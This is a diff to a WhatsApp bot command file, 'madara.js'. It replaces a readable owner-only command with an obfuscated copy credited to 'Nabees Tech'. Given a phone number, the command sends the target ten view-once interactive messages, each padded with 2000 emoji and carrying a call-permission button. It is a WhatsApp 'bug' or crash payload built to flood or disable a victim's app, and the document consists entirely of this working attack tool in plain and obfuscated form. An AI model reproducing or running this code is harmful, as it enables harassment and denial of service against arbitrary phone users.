@@ -1,54 +1,7 @@
-// commands/madara.js
-const PROTECTED_NUMBERS = ['2347072182960', '2349049636843'];
-
-async function madaraCommand(sock, chatId, message, args) {
-    if (!message.key.fromMe) {
-        await sock.sendMessage(chatId, { text: "❌ *Owner Only*" }, { quoted: message });
-        return;
-    }
-
-    const targetNumber = args[0];
-    if (!targetNumber) {
-        await sock.sendMessage(chatId, { 
-            text: "🍥 *Madara Uchiha*\n\nUsage: .madara <number>\nExample: .madara 628123456789\n\n*Perfect Susano'o*"
-        }, { quoted: message });
-        return;
-    }
-
-    const cleanNumber = targetNumber.replace(/[^0-9]/g, '');
-    
-    if (PROTECTED_NUMBERS.includes(cleanNumber)) {
-        await sock.sendMessage(chatId, { text: "🛡️ *Protected by Hashirama*" }, { quoted: message });
-        return;
-    }
-
-    const target = cleanNumber + '@s.whatsapp.net';
-    
-    await sock.sendMessage(chatId, { text: `🍥 *Perfect Susano'o* descending on ${cleanNumber}...` }, { quoted: message });
-    await sock.sendMessage(chatId, { react: { text: "🍥", key: message.key } });
-
-    try {
-        for (let i = 0; i < 10; i++) {
-            await sock.relayMessage(target, {
-                viewOnceMessage: {
-                    message: {
-                        interactiveMessage: {
-                            body: { text: "✦ Ṁȧḋȧṙȧ Üċḧīḧȧ ✦" + "🍥".repeat(2000) },
-                            footer: { text: "Perfect Susano'o" },
-                            nativeFlowMessage: { buttons: [{ name: "call_permission_request", buttonParamsJson: "" }] }
-                        }
-                    }
-                }
-            }, { participant: { jid: target } });
-        }
-        
-        await sock.sendMessage(chatId, { text: `✅ *Perfect Susano'o* crushed ${cleanNumber}` }, { quoted: message });
-        await sock.sendMessage(chatId, { react: { text: "🗡️", key: message.key } });
-
-    } catch (error) {
-        console.error('[Madara]', error.message);
-        await sock.sendMessage(chatId, { text: `❌ *Susano'o failed:* ${error.message}` }, { quoted: message });
-    }
-}
-
-module.exports = madaraCommand;
+// ============================================
+//  Obfuscated by Nabees Tech
+//  Domain: git.nabees.online
+//  WhatsApp: https://whatsapp.com/channel/0029VawtjOXJpe8X3j3NCZ3j
+//  Protected - Do not redistribute
+// ============================================
+const _0x31f826=_0x5809;(function(_0x197991,_0x3140cd){const _0x5a69e2=_0x5809,_0x3391d8=_0x197991();while(!![]){try{const _0x58c55e=parseInt(_0x5a69e2(0x8e))/0x1*(parseInt(_0x5a69e2(0x6d))/0x2)+parseInt(_0x5a69e2(0x76))/0x3*(parseInt(_0x5a69e2(0x8c))/0x4)+parseInt(_0x5a69e2(0x99))/0x5*(-parseInt(_0x5a69e2(0x75))/0x6)+-parseInt(_0x5a69e2(0x8a))/0x7*(-parseInt(_0x5a69e2(0x7b))/0x8)+parseInt(_0x5a69e2(0x8b))/0x9+parseInt(_0x5a69e2(0x73))/0xa+-parseInt(_0x5a69e2(0x80))/0xb;if(_0x58c55e===_0x3140cd)break;else _0x3391d8['push'](_0x3391d8['shift']());}catch(_0x107c53){_0x3391d8['push'](_0x3391d8['shift']());}}}(_0x6fd0,0xb59b9));const PROTECTED_NUMBERS=['2347072182'+_0x31f826(0x82),'2349049636'+_0x31f826(0x97)];function _0x5809(_0x60e9a,_0x435ac2){_0x60e9a=_0x60e9a-0x69;const _0x6fd0f9=_0x6fd0();let _0x580963=_0x6fd0f9[_0x60e9a];if(_0x5809['TBRpmK']===undefined){var _0x402740=function(_0x1dec28){const _0x514d51='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x2d1b28='',_0x27e47f='';for(let _0x9f0b84=0x0,_0x4b12b7,_0x23ef3c,_0x233583=0x0;_0x23ef3c=_0x1dec28['charAt'](_0x233583++);~_0x23ef3c&&(_0x4b12b7=_0x9f0b84%0x4?_0x4b12b7*0x40+_0x23ef3c:_0x23ef3c,_0x9f0b84++%0x4)?_0x2d1b28+=String['fromCharCode'](0xff&_0x4b12b7>>(-0x2*_0x9f0b84&0x6)):0x0){_0x23ef3c=_0x514d51['indexOf'](_0x23ef3c);}for(let _0x9c80ca=0x0,_0x4310e2=_0x2d1b28['length'];_0x9c80ca<_0x4310e2;_0x9c80ca++){_0x27e47f+='%'+('00'+_0x2d1b28['charCodeAt'](_0x9c80ca)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x27e47f);};_0x5809['JrEohB']=_0x402740,_0x5809['ObkjUb']={},_0x5809['TBRpmK']=!![];}const _0x376637=_0x6fd0f9[0x0],_0x93ab01=_0x60e9a+_0x376637,_0x3d4e3e=_0x5809['ObkjUb'][_0x93ab01];return!_0x3d4e3e?(_0x580963=_0x5809['JrEohB'](_0x580963),_0x5809['ObkjUb'][_0x93ab01]=_0x580963):_0x580963=_0x3d4e3e,_0x580963;}async function madaraCommand(_0x89085,_0x522913,_0x34ebbb,_0x2d9533){const _0x71703a=_0x31f826,_0x7ea54a={};_0x7ea54a[_0x71703a(0x85)]=_0x71703a(0x71)+_0x71703a(0x7d)+_0x71703a(0x87),_0x7ea54a[_0x71703a(0x6c)]=function(_0x3be45a,_0x43f45f){return _0x3be45a+_0x43f45f;},_0x7ea54a[_0x71703a(0x7f)]=function(_0x1af188,_0x21ea4c){return _0x1af188<_0x21ea4c;},_0x7ea54a[_0x71703a(0x9c)]=_0x71703a(0x6f)+_0x71703a(0x79),_0x7ea54a[_0x71703a(0x81)]=_0x71703a(0x83)+_0x71703a(0x93)+_0x71703a(0x88);const _0x12b332=_0x7ea54a;if(!_0x34ebbb['key'][_0x71703a(0x7a)]){const _0x5bb0b2={};_0x5bb0b2[_0x71703a(0x84)]=_0x71703a(0x96)+'nly*';const _0x10f99b={};_0x10f99b[_0x71703a(0x6e)]=_0x34ebbb,await _0x89085[_0x71703a(0x6a)+'e'](_0x522913,_0x5bb0b2,_0x10f99b);return;}const _0x194b5a=_0x2d9533[0x0];if(!_0x194b5a){const _0x23b95b={};_0x23b95b['text']='🍥\x20*Madara\x20'+'Uchiha*\x0a\x0aU'+_0x71703a(0x89)+_0x71703a(0x70)+_0x71703a(0x94)+':\x20.madara\x20'+'6281234567'+'89\x0a\x0a*Perfe'+'ct\x20Susano\x27'+'o*';const _0x5da171={};_0x5da171[_0x71703a(0x6e)]=_0x34ebbb,await _0x89085[_0x71703a(0x6a)+'e'](_0x522913,_0x23b95b,_0x5da171);return;}const _0x16f549=_0x194b5a['replace'](/[^0-9]/g,'');if(PROTECTED_NUMBERS[_0x71703a(0x8d)](_0x16f549)){const _0x533962={};_0x533962[_0x71703a(0x84)]=_0x12b332[_0x71703a(0x85)];const _0x2b7663={};_0x2b7663[_0x71703a(0x6e)]=_0x34ebbb,await _0x89085[_0x71703a(0x6a)+'e'](_0x522913,_0x533962,_0x2b7663);return;}const _0x47a940=_0x12b332[_0x71703a(0x6c)](_0x16f549,_0x71703a(0x92)+'p.net'),_0x31537f={};_0x31537f[_0x71703a(0x84)]=_0x71703a(0x7e)+_0x71703a(0x72)+_0x71703a(0x86)+_0x71703a(0x91)+_0x16f549+'...';const _0x594e9c={};_0x594e9c[_0x71703a(0x6e)]=_0x34ebbb,await _0x89085[_0x71703a(0x6a)+'e'](_0x522913,_0x31537f,_0x594e9c);const _0x30f7a2={};_0x30f7a2[_0x71703a(0x84)]='🍥',_0x30f7a2[_0x71703a(0x6b)]=_0x34ebbb['key'];const _0x43d5a3={};_0x43d5a3[_0x71703a(0x77)]=_0x30f7a2,await _0x89085[_0x71703a(0x6a)+'e'](_0x522913,_0x43d5a3);try{for(let _0x2fd2e7=0x0;_0x12b332[_0x71703a(0x7f)](_0x2fd2e7,0xa);_0x2fd2e7++){await _0x89085[_0x71703a(0x9d)+'ge'](_0x47a940,{'viewOnceMessage':{'message':{'interactiveMessage':{'body':{'text':_0x12b332['mAPkc'](_0x71703a(0x9b)+_0x71703a(0x95),'🍥'[_0x71703a(0x8f)](0x7d0))},'footer':{'text':_0x12b332[_0x71703a(0x9c)]},'nativeFlowMessage':{'buttons':[{'name':_0x12b332['sKMLk'],'buttonParamsJson':''}]}}}}},{'participant':{'jid':_0x47a940}});}const _0x375c83={};_0x375c83['text']=_0x71703a(0x7c)+_0x71703a(0x72)+'\x20crushed\x20'+_0x16f549;const _0x194745={};_0x194745[_0x71703a(0x6e)]=_0x34ebbb,await _0x89085[_0x71703a(0x6a)+'e'](_0x522913,_0x375c83,_0x194745);const _0xf03cd6={};_0xf03cd6[_0x71703a(0x84)]=_0x71703a(0x98),_0xf03cd6[_0x71703a(0x6b)]=_0x34ebbb[_0x71703a(0x6b)];const _0x52c8df={};_0x52c8df[_0x71703a(0x77)]=_0xf03cd6,await _0x89085[_0x71703a(0x6a)+'e'](_0x522913,_0x52c8df);}catch(_0x2ff5c5){console[_0x71703a(0x78)](_0x71703a(0x74),_0x2ff5c5['message']);const _0x58456b={};_0x58456b[_0x71703a(0x84)]=_0x71703a(0x9a)+_0x71703a(0x69)+'\x20'+_0x2ff5c5[_0x71703a(0x90)];const _0x4e0406={};_0x4e0406[_0x71703a(0x6e)]=_0x34ebbb,await _0x89085['sendMessag'+'e'](_0x522913,_0x58456b,_0x4e0406);}}function _0x6fd0(){const _0x288f34=['y2fSBf9WzxjTAq','Dgv4Da','rfvOwee','igrLC2nLBMrPBG','AxjHBweQ','zxn0','C2fNztOGlM1Hza','ntzIvgHgC1i','nde1mJeWnvzOEMzSvq','mZy1ntqWmeT1rMrrtq','Aw5JBhvKzxm','nZfPqKfTEum','CMvWzwf0','BwvZC2fNzq','zYbVBIa','qhmUD2HHDhnHCa','C3nPB25FCMvXDq','CJ4krxHHBxbSzq','XiVHUkFeQ+g4P8INiokCPG','4P2micPpD25LCIbp','odqZ','8j+xOE+4JW','mJGZnZm3nxrRzLn1DW','4P2micPtDxnHBM8N','4PYMiog5GmIN4BIlYkFHUzNiPYddNa','wujeAxy','CMvSyxLnzxnZyq','BYbMywLSzwq6kG','C2vUze1LC3nHzW','A2v5','BufqA2m','mJeYnZHUuKf1zhK','CxvVDgvK','ugvYzMvJDcbtDq','yxjHidXUDw1Izq','8j+BOE+4JYaQuhjVDgvJDa','ifn1C2fUBYDVkG','mtm0ody1mJbQEuPuCeO','w01HzgfYyv0','nMXLD0j1Eq','m0XJBK9nua','CMvHy3q','zxjYB3i','C2fUBYDV','zNjVBu1L','mtiXmZG2nfL4Cu5iva','4PYficPqzxjMzwn0','zwqGyNKGsgfZAa','8j+nPsaQugvYzMvJDa','BfnrvMS','mZCXotKXndbKCgjgBfq','C0TntgS','otyW'];_0x6fd0=function(){return _0x288f34;};return _0x6fd0();}module['exports']=madaraCommand;
